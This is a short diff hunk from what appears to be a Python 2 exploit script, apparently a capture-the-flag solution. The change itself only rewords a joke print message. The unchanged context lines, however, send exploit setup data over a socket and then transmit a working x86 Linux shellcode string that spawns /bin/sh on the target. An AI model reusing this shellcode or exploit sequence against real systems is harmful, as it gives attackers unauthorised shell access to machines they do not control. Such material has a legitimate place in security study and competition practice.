@@ -71,7 +71,7 @@ for i in range(110):
 # set ecx to end of our stage1
 s.send('40,16\na\n')
 
-print "Wait for it, it's gonna be legen..."
+print "It's gonna be legen... wait for it"
 time.sleep(8)
 sc = '1\xc9\xf7\xe1Qh//shh/bin\x89\xe3\xb0\x0b\xcd\x80'
 s.send(sc + '\n')
